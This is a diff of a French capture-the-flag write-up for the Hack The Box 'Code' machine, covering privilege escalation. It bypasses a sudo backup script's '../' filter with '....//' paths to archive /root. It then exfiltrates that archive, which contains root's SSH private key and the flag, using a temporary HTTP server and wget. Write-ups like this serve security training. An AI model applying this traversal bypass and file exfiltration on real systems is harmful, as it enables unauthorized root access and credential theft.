@@ -887,33 +887,31 @@ done
 
 Le script attend un fichier JSON en argument, vérifie son existence, puis lit la clé `directories_to_archive`.
 
-Avant d’effectuer la vérification des chemins, il applique une transformation avec `jq` :
+Avant de vérifier les chemins autorisés, il applique un filtrage avec `jq` :
 
 ```bash
 updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
 ```
 
-Cette ligne supprime les occurrences de `../` dans les chemins fournis. L’objectif est d’empêcher une traversée de répertoires classique vers des emplacements sensibles comme `/root`.
+L’objectif est de supprimer les traversées de répertoires classiques de type `../`.
 
-Ensuite, le script vérifie que chaque chemin commence par `/var/` ou `/home/` :
+Le script vérifie ensuite que chaque chemin commence par `/var/` ou `/home/` :
 
 ```bash
 allowed_paths=("/var/" "/home/")
 ```
 
-Si tous les chemins passent cette vérification, le fichier JSON modifié est transmis au binaire exécuté en root :
+Si la validation réussit, le fichier JSON modifié est transmis au binaire exécuté avec les privilèges root :
 
 ```bash
 /usr/bin/backy "$json_file"
 ```
 
-Le script tente de bloquer les traversées de répertoires en supprimant les occurrences exactes de `../` :
+### Contournement du filtrage
 
-```bash
-updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
-```
+Le filtrage supprime uniquement les occurrences exactes de `../`.
 
-Mais ce filtrage peut être contourné avec une séquence comme :
+Il est donc possible de le contourner avec une séquence comme :
 
 ```bash
 ....//
@@ -947,9 +945,7 @@ Ce contournement permet donc de sauvegarder `/root`.
 
 ### Modification de task.json
 
-Même si `/dev/shm` est nettoyé régulièrement, il reste ici le répertoire de travail le plus fiable pour cette exploitation, car `backy` y crée correctement l’archive attendue.
-
-Le fichier `task.json` d’origine est prévu pour sauvegarder l’application située dans `/home/app-production/app` :
+Le fichier `/home/martin/backups/task.json` d’origine est prévu pour sauvegarder l’application située dans `/home/app-production/app` :
 
 ```json
 {
@@ -966,24 +962,28 @@ Le fichier `task.json` d’origine est prévu pour sauvegarder l’application s
 }
 ```
 
-Tu modifies les lignes `directories_to_archive` et `destination` de task.json :
+Comme souvent en CTF, tu utilises `/dev/shm` comme répertoire de travail temporaire.
 
-```python
-"destination": "/var/tmp/backups"
-"directories_to_archive": ["/home/martin/....//....//root"]
+Tu te places d’abord dans le répertoire `/home/martin/backups/`, puis tu remplaces le contenu du fichier par un `task.json` minimal contenant uniquement le chemin à archiver et le répertoire de destination :
+
+
+```json
+{
+	"directories_to_archive": ["/home/martin/....//....//root"],
+	"destination": "/dev/shm"
+}
 ```
-
 ### backup de /root
 
-Tu peux ensuite lancer `backy.sh` avec les privilèges root avec ton /var/tmp/backups/mytask.json :
+Tu peux ensuite lancer `backy.sh` avec les privilèges root :
 
-```
-sudo /usr/bin/backy.sh /var/tmp/backups/mytask.json
+```bash
+sudo /usr/bin/backy.sh task.json
 ```
 
-Le script confirme alors qu’il archive ce qui est en réalité le répertoire `/root` :
+Le script confirme qu’il archive ce qui est en réalité le répertoire `/root` :
 
-```
+```bash
 sudo /usr/bin/backy.sh task.json
 [date] 🍀 backy 1.2
 [date] 📋 Working with task.json ...
@@ -991,18 +991,73 @@ sudo /usr/bin/backy.sh task.json
 [date] 📤 Archiving: [/home/martin/../../root]
 [date] 📥 To: /dev/shm ...
 [date] 📦
-
 ```
 
-Une archive contenant le contenu de `/root` est alors créée dans `/var/tmp/backups`.
 
-### Téléchargement du backup /root
+Une archive contenant le contenu de `/root` est alors créée dans `/dev/shm`.
 
+### Téléchargement du backup de /root
 
+Comme expliqué dans la recette {{< recette "copier-fichiers-kali" >}}, tu télécharges ensuite l’archive sur ta machine Kali pour analyser son contenu plus facilement.
+
+Depuis la cible, dans le répertoire `/dev/shm`, tu lances un serveur HTTP temporaire :
+
+```bash
+python3 -m http.server 8000
+```
+
+Depuis ta machine Kali, tu récupères ensuite l’archive avec `wget` :
+
+```bash
+wget http://code.htb:8000/code_home_martin_.._.._root_2026_xxx.tar.bz2
+```
 
 ### root.txt
 
+Dans ton Kali, tu décompresses l’archive `tar.bz2` avec :
 
+```bash
+tar xvf code_home_martin_.._.._root_2026_xxx.tar.bz2
+```
+
+Tu obtiens alors le contenu du répertoire `/root` :
+
+```bash
+root/
+root/.local/
+root/.local/share/
+root/.local/share/nano/
+root/.local/share/nano/search_history
+root/.selected_editor
+root/.sqlite_history
+root/.profile
+root/scripts/
+root/scripts/cleanup.sh
+root/scripts/backups/
+root/scripts/backups/task.json
+root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
+root/scripts/database.db
+root/scripts/cleanup2.sh
+root/.python_history
+root/root.txt
+root/.cache/
+root/.cache/motd.legal-displayed
+root/.ssh/
+root/.ssh/id_rsa
+root/.ssh/authorized_keys
+root/.bash_history
+root/.bashrc
+```
+
+Il ne te reste plus qu’à lire le flag root :
+
+```
+cat root/root.txt     
+b03axxxxxxxxxxxxxxxxxxxxxxxxxxf063
+
+```
+
+Avec la récupération du flag `root.txt`, la machine Code est maintenant complètement compromise et le CTF terminé.
 
 ---
 
